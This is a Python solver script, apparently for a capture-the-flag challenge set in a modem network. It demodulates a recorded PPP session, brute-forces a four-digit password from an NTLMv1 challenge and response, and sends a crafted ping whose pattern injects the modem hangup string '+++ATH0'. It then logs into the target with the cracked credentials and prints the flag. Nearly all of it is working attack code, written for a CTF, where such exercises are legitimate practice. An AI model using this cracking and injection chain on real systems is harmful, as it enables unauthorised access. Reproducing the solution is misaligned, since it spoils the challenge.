#!/usr/bin/env python3

import os
import re
import string
import subprocess
import sys

from ntlm_auth.compute_response import ComputeResponse
from pwnlib.tubes.remote import remote


def hex_escape(s):
    printable = string.ascii_letters + string.digits + string.punctuation + ' '
    return ''.join(c if c in printable else r'\x{0:02x}'.format(ord(c)) for c in s)


def debug_recv_and_send(waiting_print, expect, reply_print, reply):
    """
    I was having some real trouble with the actual pwnlib functions... no idea why.
    They're not really possible to debug.
    """
    print(waiting_print)
    # import ipdb; ipdb.set_trace()
    full_resp = ""
    # resp = ""
    while expect not in full_resp:
        # if resp:
        #     print(f"Rejected Response: {hex_escape(resp)}")
        resp = t.recv().decode("ascii")
        full_resp += resp
    # print(f"Accepted Response: {hex_escape(resp)}")
    # print(f"  ^ Full Response: {hex_escape(full_resp)}")
    print(reply_print)
    t.send(reply + "\n")


def recv_regex(waiting_print, regex):
    print(waiting_print)
    full_resp = ""
    # resp = ""
    while not re.search(regex, full_resp):
        # if resp:
        #     print(f"Rejected Response: {hex_escape(resp)}")
        resp = t.recv().decode("ascii")
        full_resp += resp
    # print(f"Accepted Response: {hex_escape(resp)}")
    # print(f"  ^ Full Response: {hex_escape(full_resp)}")
    return re.search(regex, full_resp).group(1)


if __name__ == "__main__":
    Ticket = os.getenv("TICKET", "")
    generated_files_dir = os.getenv("DIR", "/in")
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", "8888"))

    print("=== SECTION 1/2 - Extracting data from files ===")

    ################################################################################################
    # Demodulate wav file - get solution server number and password

    print("[STEP 1/3] Extracting data from recording.wav")

    env = os.environ.copy()
    env['RECORDING_WAV_FILE'] = os.path.join(generated_files_dir, "recording.wav")

    demod_proc = subprocess.Popen(
        ['bash', './modulation/do_demod.sh'],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    demod_proc_stdout, demod_proc_stderr = demod_proc.communicate()
    if demod_proc.returncode != 0:
        sys.stderr.write(f"Error executing solver: do_demod\n\n{demod_proc_stderr.decode('ascii')}")
        exit(1)

    # import ipdb; ipdb.set_trace()

    solution_server_number, challenge, response, username = tuple(demod_proc_stdout.decode("charmap").split("\n")[:-1])

    challenge = bytearray.fromhex(challenge.rjust(16, '0'))
    response = response.rjust(98, '0')
    response_hash = response[48:-2]

    print(f"    Solution server number: {solution_server_number}")
    print(f"    Challenge:              {challenge.hex()}")
    print(f"    Response Hash:          {response_hash}")
    print(f"    Username:               {username}")

    ################################################################################################
    # Crack password found in PPP challenge / response

    print("[STEP 2/3] Cracking password")

    password = None
    for i in range(0, 9999):
        guess = str(i).rjust(4, '0')
        guess_hash, _ = ComputeResponse._get_NTLMv1_response(guess, challenge)
        guess_hash = guess_hash.hex()
        if guess_hash == response_hash:
            password = guess
            break
    assert password is not None, "No matching password found"

    print(f"    Password:               {password}")

    ################################################################################################
    # Get my phone number

    print("[STEP 3/3] Extracting data from my_note.txt")

    my_note_txt = os.path.join(generated_files_dir, "my_note.txt")
    with open(my_note_txt, 'r') as fh:
        my_server_number = ''.join(list(filter(
            str.isdigit,
            re.search("Phone #: ([0-9\-]+)", fh.read()).group(1)
        )))

    print(f"    My server number:       {my_server_number}")

    ################################################################################################
    # Done with files, interact with challenge docker

    print("")
    print("=== SECTION 2/2 - Interacting with challenge docker ===")

    try:
        t = remote(Host, Port)
        if len(Ticket):
            t.recvline()
            t.sendline(Ticket)
            print("Sent Ticket: " + Ticket)
        debug_recv_and_send(
            "[STEP 1/19] Waiting for initial banner", "Connected to /dev/ttyACM0\n",
            "[STEP 2/19] Dialing into my server", f"ATD{my_server_number}"
        )

        debug_recv_and_send(
            "[STEP 3/19] Waiting for my server's username prompt", "Username: ",
            "[STEP 4/19] Sending my server's username", "hax"
        )

        debug_recv_and_send(
            "[STEP 5/19] Waiting for my server's password prompt", "Password: ",
            "[STEP 6/19] Sending my server's password", "hunter2"
        )

        debug_recv_and_send(
            "[STEP 7/19] Waiting for fakesh, then pinging", "fakesh-4.4$ ",
            "[STEP 8/19] Sending ping of death", "ping -p 2B2B2B415448300D 93.184.216.34"
        )

        debug_recv_and_send(
            "[STEP 9/19] Waiting for fakesh, then exiting", "fakesh-4.4$ ",
            "[STEP 10/19] Sending exit command", "exit"
        )

        debug_recv_and_send(
            "[STEP 11/19] Waiting for NO CARRIER", "NO CARRIER\n",
            "[STEP 12/19] Dialing into solution server", f"ATD{solution_server_number}"
        )

        debug_recv_and_send(
            "[STEP 13/19] Waiting for solution server's username prompt", "Username: ",
            "[STEP 14/19] Sending solution server's username", f"{username}"
        )

        debug_recv_and_send(
            "[STEP 15/19] Waiting for solution server's password prompt", "Password: ",
            "[STEP 16/19] Sending solution server's password", f"{password}"
        )

        debug_recv_and_send(
            "[STEP 17/19] Waiting for satnet prompt", "satnet> ",
            "[STEP 18/19] Sending flag command", "flag"
        )

        FLAG_REGEX = r"(flag{.*})"
        flag = recv_regex(
            "[STEP 19/19] Waiting for flag", FLAG_REGEX
        )
        print(flag)
        print("")
        print("Done!")

    except Exception:
        print("No Remote Host Found")
